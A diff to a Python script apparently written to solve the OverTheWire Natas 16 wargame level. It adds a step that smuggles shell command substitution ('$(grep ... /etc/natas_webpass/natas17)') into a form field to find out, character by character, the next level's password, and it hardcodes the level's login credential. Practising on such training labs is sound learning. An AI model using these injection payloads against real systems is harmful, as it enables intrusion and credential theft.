@@ -11,7 +11,7 @@ from string import ascii_uppercase
 numbers = "0123456789"
 
 # most likely like a MD5 hash 32 characters
-characters_set = ascii_lowercase + ascii_uppercase + numbers
+characters_set = numbers + ascii_lowercase + ascii_uppercase
 
 
 def format_timer(seconds):
@@ -28,6 +28,22 @@ def format_timer(seconds):
         return '%s %dm %ds' % (sign_string, minutes, seconds)
     else:
         return '%s %ds' % (sign_string, seconds)
+
+def reduce_character_set(character_set):
+    reduced_character_set = ""
+    rcs_action_name = "*  Reduce character set.  *"
+    print("\n{1}\n{0}\n{1}\n\n[ETA < 1m] Checking to see which characters are the password.".format(
+        rcs_action_name,
+        "*" * len(rcs_action_name)
+    ))
+    for character in character_set:
+        user_data = {'needle': '$(grep {0} /etc/natas_webpass/natas17)exists'.format(character)}
+        request = requests.post('http://natas16.natas.labs.overthewire.org/index.php',
+                                auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), data=user_data)
+        if 'exists' not in request.text:
+            character = character[-1:]  # remove escape
+            reduced_character_set = reduced_character_set + character
+    return reduced_character_set
 
 def find_password(password_character_set):
     part_password = ""
@@ -49,13 +65,19 @@ def find_password(password_character_set):
                 part_password = part_password + character
                 print("Confirmed password characters: {0}".format(part_password))
                 break
-            if character == "9":
+            if character == password_character_set[-1:]:
                 print("Not found.")
+                return None
     return part_password
 
 t0 = time.time()  # Start timing
-password = find_password(characters_set)
+new_character_set = reduce_character_set(characters_set)
+t1 = time.time()  # reduce character set done, starting password search.
+print("[Reduce character set - completed in:{0}] Confirmed new characters set. "
+      "The following characters are found in password: {1}".format(format_timer(t1 - t0), new_character_set))
+password = find_password(new_character_set)
 if password:
-    t1 = time.time()  # End timer the search for the password is complete.
+    t2 = time.time()  # End timer the search for the password is complete.
     print(
-        "[Password search - completed in:{0}] Success, the password is: {1}\n".format(format_timer(t1 - t0), password))
+        "[Password search - completed in:{0}] Success, the password is: {1}\n".format(format_timer(t2 - t1), password))
+    print("Total Time Taken:{0}".format(format_timer(t2 - t0)))
